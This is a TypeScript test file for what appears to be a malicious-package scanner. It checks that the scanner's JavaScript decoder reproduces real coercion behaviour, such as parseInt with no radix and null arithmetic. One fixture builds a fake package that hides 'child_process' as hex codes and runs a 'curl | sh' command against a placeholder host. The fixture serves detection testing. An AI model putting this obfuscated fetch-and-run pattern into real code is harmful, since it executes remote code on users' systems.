// What JavaScript gives, the decoder must give: a value it gets wrong hides the name a program builds. `parseInt` with
// no radix reads `0x41` as hex, `true + 1` is 2, and `null` is not `undefined`.
import { describe, expect, test } from "bun:test";
import { parse } from "acorn";
import { runDecoder, type Known } from "../src/decode.ts";
import { analyze, finalize, type TarEntry } from "../src/index.ts";

const fnOf = (src: string) => {
  const first = parse(src, { ecmaVersion: "latest" }).body[0];

  if (first?.type !== "FunctionDeclaration") throw new Error("expected a function");

  return first;
};

const host = { constant: () => null, localFunction: () => null };
const text = (value: string): Known => ({ kind: "text", value });
const decoded = (src: string, arg: string) => runDecoder(fnOf(src), [text(arg)], host);

/** What the same function returns when JavaScript runs it. */
const real = (src: string, arg: string): string => new Function(`${src}; return g(${JSON.stringify(arg)});`)();

describe("the decoder computes what JavaScript computes", () => {
  const cases: [string, string, string][] = [
    ["parseInt with no radix reads 0x as hex", 'function g(h){return h.split(" ").map(c=>String.fromCharCode(parseInt(c))).join("")}', "0x61 0x78 0x69 0x6f 0x73"],
    ["parseInt with an undefined radix", "function g(h){return String(parseInt(h,undefined))}", "0x41"],
    ["parseInt with no radix still reads decimal", "function g(h){return String(parseInt(h))}", "  42px"],
    ["a boolean adds as a number", "function g(h){return String(true+1)+String(false+false)}", ""],
    ["null adds as 0", "function g(h){return String(null+1)}", ""],
    ["undefined adds as NaN", "function g(h){return String(undefined+1)}", ""],
    ["null joined to a string", 'function g(h){return "k"+null+h}', "x"],
    ["String(null)", "function g(h){return String(null)}", ""],
    ["null in a template", "function g(h){return `${1+1}${h}${null}`}", "a"],
    ["null and undefined in a joined list", 'function g(h){return [1,null,undefined,3].join("-")}', ""],
    ["a string still concatenates", "function g(h){return h+1+2+true}", "a"],
    ["a null Buffer encoding reads utf8", 'function g(h){return Buffer.from(h,null).toString()}', "axios"],
  ];

  for (const [label, src, arg] of cases) {
    test(label, () => {
      expect(decoded(src, arg)).toEqual({ kind: "decoded", value: real(src, arg) });
    });
  }

  // each throws in JavaScript: a program that throws, not a limit apm hit
  for (const src of ["function g(h){return (255).toString(null)}", 'function g(h){return Buffer.from(h,"utf8").toString(null)}']) {
    test(`${src.slice(21, -1)} throws, so it is not a decoder apm runs`, () => {
      expect(() => real(src, "axios")).toThrow();
      expect(decoded(src, "axios")).toEqual({ kind: "unsupported" });
    });
  }
});

describe("a module name built with parseInt's default radix is read", () => {
  const entry = (path: string, body: string): TarEntry => {
    const data = new TextEncoder().encode(body);

    return { path, size: data.length, mode: 0o644, data };
  };

  const scored = (decoder: string, codes: string) => {
    const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js" };
    const src = `${decoder}\nconst cp = require(d("${codes}"));\ncp.exec("curl -s https://example.invalid/x.sh | sh");\n`;
    const files = [entry("package.json", JSON.stringify(manifest)), entry("index.js", src)];
    const r = finalize(analyze({ name: "probe-pkg", manifest, files, publisher: "a", previousPublishers: [] }), { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

    return { score: r.score, ids: r.signals.map((s) => s.id).sort() };
  };

  const name = [..."child_process"].map((c) => c.charCodeAt(0));

  test("0x codes with no radix score as hex codes with radix 16 do", () => {
    const hex = scored('function d(h){return h.split(" ").map(c=>String.fromCharCode(parseInt(c,16))).join("")}', name.map((c) => c.toString(16)).join(" "));
    const prefixed = scored('function d(h){return h.split(" ").map(c=>String.fromCharCode(parseInt(c))).join("")}', name.map((c) => `0x${c.toString(16)}`).join(" "));

    expect(prefixed).toEqual(hex);
  });
});
